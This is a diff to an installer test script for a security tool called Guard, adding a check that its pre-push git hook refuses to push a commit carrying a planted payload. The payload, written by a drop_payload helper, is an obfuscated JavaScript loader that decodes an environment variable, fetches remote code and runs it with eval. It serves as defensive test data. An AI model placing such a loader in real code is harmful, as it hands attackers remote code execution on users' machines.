@@ -3,7 +3,8 @@
 # binary built from this commit, then checks the installed Guard works:
 #
 #   1. ./install.sh (source install): binary in ~/.guard/bin, git hooks, config
-#      and the per-user service (systemd --user / LaunchAgent).
+#      and the per-user service (systemd --user / LaunchAgent). The pre-push
+#      hook blocks a real `git push` of the loader.
 #   2. docs/guard.sh, the one-liner users pipe into `sudo bash`, served from a
 #      local web server so it downloads this build instead of the latest release.
 #
@@ -43,6 +44,32 @@ drop_payload() {
         "  const src = at""ob(process.env.AUTH_API_KEY);" \
         "  const proxyInfo = await (await fetch(src)).text();" \
         "  eval(proxy""Info);" "})();" > "$1"
+}
+
+# check_push_gate <tag>: with Guard's global git hooks installed, `git push` of
+# a commit carrying the loader is refused and the remote stays put, while a
+# clean push goes through.
+check_push_gate() {
+    local d="$WORK/push-$1"
+    rm -rf "$d"; mkdir -p "$d"
+    git init -q --bare -b main "$d/remote.git"
+    git init -q -b main "$d/work"
+    git -C "$d/work" remote add origin "$d/remote.git"
+    printf 'export const a = 1;\n' > "$d/work/a.js"
+    git -C "$d/work" add -A
+    git -C "$d/work" -c user.name=ci -c user.email=ci@example.com commit -qm clean
+    git -C "$d/work" push -q origin main || fail "the pre-push hook blocked a clean push"
+    local clean; clean=$(git -C "$d/remote.git" rev-parse main)
+    drop_payload "$d/work/b.js"
+    git -C "$d/work" add -A
+    git -C "$d/work" -c user.name=ci -c user.email=ci@example.com commit -qm infected
+    if git -C "$d/work" push origin main 2> "$d/push.err"; then
+        cat "$d/push.err"; fail "an infected push went through"
+    fi
+    cat "$d/push.err"
+    grep -q "BLOCKED" "$d/push.err" || fail "the pre-push hook said nothing about the block"
+    [ "$(git -C "$d/remote.git" rev-parse main)" = "$clean" ] || fail "the remote moved on an infected push"
+    echo "pre-push hook blocked the infected push ($1)"
 }
 
 # check_watcher <sudo or ""> <guard home>: once the service is up, a malicious
@@ -174,6 +201,7 @@ step "install.sh: check the install"
 [ -s "$HOME/.guard/watcher.config.json" ] || fail "install.sh wrote no watcher.config.json"
 [ "$(git config --global --get core.hooksPath)" = "$HOME/.guard/githooks" ] \
     || fail "install.sh did not set the global git hooks"
+check_push_gate install.sh
 service_up user || { show_service user; fail "the watcher service is not running"; }
 check_preinstalled "" "$HOME/.guard"
 check_watcher "" "$HOME/.guard"
@@ -254,6 +282,14 @@ else
 fi
 end
 
+step "guard.sh: git hooks for the user who ran sudo"
+[ "$(git config --global --get core.hooksPath)" = "$HOME/.guard/githooks" ] \
+    || fail "guard.sh did not set $USER's global git hooks"
+[ "$(stat -c %U "$HOME/.guard/githooks/pre-push" 2>/dev/null || stat -f %Su "$HOME/.guard/githooks/pre-push")" = "$USER" ] \
+    || fail "the git hooks are not owned by $USER"
+check_push_gate guard.sh
+end
+
 step "guard.sh: reinstall over the running service"
 one_liner good
 wait_for 30 "the service to run again" service_running system
@@ -262,5 +298,6 @@ end
 step "guard uninstall"
 sudo /usr/local/bin/guard uninstall
 wait_for 30 "the service to stop" service_gone system
+[ -z "$(git config --global --get core.hooksPath || true)" ] || fail "guard uninstall left core.hooksPath set"
 end
 echo "installers OK"
